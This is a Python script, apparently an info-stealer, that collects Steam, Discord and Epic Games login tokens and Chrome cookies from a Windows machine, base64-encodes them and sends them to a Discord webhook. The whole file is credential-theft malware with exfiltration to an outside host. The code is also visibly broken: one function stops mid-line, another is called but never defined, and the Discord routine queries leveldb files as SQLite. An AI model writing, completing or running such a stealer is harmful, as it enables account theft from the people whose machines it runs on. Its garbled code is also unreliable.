import os
import json
import base64
import sqlite3
import win32crypt
import requests

# Discord webhook URL to send the tokens
WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

def send_to_webhook(webhook_url, data):
    headers = {'Content-Type': 'application/json'}
    response = requests.post(webhook_url, headers=headers, json=data)
    if response.status_code == 204:
        print("Tokens sent to webhook successfully")
    else:
        print("Failed to send tokens to webhook")

def get_steam_token():
    steam_token = None
    # Look for Steam token in the Windows registry
    try:
        import winreg
        reg_path = r"SOFTWARE\Wow6432Node\Valve\Steam"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path)
        steam_token = winreg.QueryValueEx(reg_key, "AutoLoginUserPassphrase")[0]
        winreg.CloseKey(reg_key)
        if steam_token:
            print("Steam token found in the Windows registry")
    except Exception as e:
        print(f"Error: {e}")
    # Look for Steam token in the Steam configuration file
    steam_path = os.path.join(os.getenv("APPDATA"), "Steam", "config", "loginusers.vdf")
    if os.path.exists(steam_path):
        with open(steam_path, "r") as f:
            lines = f.readlines()
            for line in lines:
                if "AccountName" in line:
                    account_name = line.strip().split("\"")[3]
                elif "Wgtoken" in line:
                    steam_token = line.strip().split("\"")[3]
        if steam_token:
            print("Steam token found in the Steam configuration file")
    return {"Steam": steam_token}

def get_discord_token():
    discord_token = None
    # Look for Discord token in the Discord configuration file
    discord_path = os.path.join(os.getenv("APPDATA"), "Discord", "Local Storage", "leveldb")
    if os.path.exists(discord_path):
        for filename in os.listdir(discord_path):
            if filename.endswith(".log") or filename.endswith(".ldb"):
                db_path = os.path.join(discord_path, filename)
                conn = sqlite3.connect(db_path)
                cursor = conn.cursor()
                cursor.execute("SELECT key, value FROM ItemTable WHERE key LIKE '%token%'")
                rows = cursor.fetchall()
                for row in rows:
                    key = row[0].encode("utf-8")
                    value = row[1].encode("utf-8")
                    if "discord" in key.lower():
                        try:
                            decrypted_value = win32crypt.CryptUnprotectData(value, None, None, None, 0)[1]
                            discord_token = decrypted_value.decode("utf-8")
                            print("Discord token found in the Discord configuration file")
                        except:
                            pass
    return {"Discord": discord_token}

def get_chrome_cookies():
    cookies = []
    # Look for Chrome cookies in the Chrome cookies file
    chrome_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Cookies")
    if os.path.exists(chrome_path):
        conn = sqlite3.connect(chrome_path)
        cursor = conn.cursor()
        cursor.execute("SELECT name, encrypted_value FROM cookies")
        rows = cursor.fetchall()
        for row in rows:
            name = row[0]
            encrypted_value =
def get_epic_games_token():
    epic_token = None
    # Look for Epic Games token in the Epic Games Launcher file
    epic_path = os.path.join(os.getenv("LOCALAPPDATA"), "EpicGamesLauncher", "Saved", "Config", "Windows", "EpicGamesLauncherPrefs.json")
    if os.path.exists(epic_path):
        with open(epic_path, "r") as f:
            data = json.load(f)
            if "LoginAccessToken" in data:
                epic_token = data["LoginAccessToken"]
                print("Epic Games token found in the Epic Games Launcher file")
    return {"Epic Games": epic_token}


if __name__ == "__main__":
    # Get tokens
    tokens = {}
    tokens.update(get_steam_token())
    tokens.update(get_discord_token())
    tokens.update(get_chrome_cookies())
    tokens.update(get_firefox_cookies())
    tokens.update(get_epic_games_token())
    
    # Send tokens to webhook
    if tokens:
        encoded_tokens = base64.b64encode(json.dumps(tokens).encode("utf-8")).decode("utf-8")
        send_to_webhook(WEBHOOK_URL, {"content": f"Tokens: {encoded_tokens}"})
    else:
        print("No tokens found")
